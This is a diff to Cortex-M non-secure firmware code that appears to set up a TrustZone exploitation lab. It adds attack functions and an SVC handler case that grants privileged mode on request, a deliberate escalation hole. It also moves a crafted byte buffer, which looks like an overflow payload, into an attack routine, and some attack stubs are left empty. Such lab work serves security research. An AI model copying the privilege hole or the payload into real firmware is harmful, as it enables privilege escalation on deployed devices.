@@ -14,7 +14,11 @@
 #define SET_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(0) \
 : "memory")
 
-void attacker_controlled(void);
+void attacker_controlled(void) __attribute__((section("unprivilege_code")));
+void attack_1(void) __attribute__((section("unprivilege_code"), noinline));
+void attack_2(void) __attribute__((section("unprivilege_code")));
+void attack_3(void);
+void attack_4(void);
 void print_LCD(char *msg);
 
 char text[] = "Hello World (non-secure)\r\n";
@@ -89,6 +93,9 @@ void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
     switch (svc_number)
     {
         case 0:
+            SET_NS_PRIVILEGES;
+            break;
+        case 1:
             print_LCD_nsc((char *) svc_args[0]);
             break;
         default:
@@ -108,16 +115,29 @@ void __attribute__((naked)) SVC_Handler(void)
 void print_LCD(char *msg)
 {
     register char* r0 __asm("r0") = msg;
-	__asm volatile("svc #0"
-		:
-		: "r"  (r0)
-	);
+    __asm volatile("svc #1"
+        :
+        : "r"  (r0)
+    );
 }
 
 void attacker_controlled(void)
+{   
+    LED_On(7u);
+    while (1) {}
+}
+
+void attack_1(void)
 {
-    while (1)
-    {}
+    DROP_NS_PRIVILEGES;
+    char user_input[28] = {
+        0x00,0x00,0x21,0x00};
+    print_LCD(user_input);
+}
+
+void attack_2(void)
+{
+    
 }
 
 static uint32_t x;
@@ -149,20 +169,11 @@ int main(void)
 #endif
 
     SystemCoreClockUpdate();
-    SysTick_Config(SystemCoreClock / 100); /* Generate interrupt each 10 ms */
+    SysTick->CTRL = 0;
 
-    DROP_NS_PRIVILEGES;
-
-    char user_input[28] = {
-		0x20,0x20,0x20,0x20,
-		0xc0,0x05,0x00,0x20,
-		0x0b,0x01,0x00,0x00,
-		0x22,0x22,0x22,0x22,
-		0x23,0x23,0x23,0x23,
-		0x24,0x24,0x24,0x24,
-		0x76,0x83,0x00,0x00};
-    print_LCD(user_input);
-
+    attack_1();
+    
+    LED_On(0u);
     while (1)
     {
 
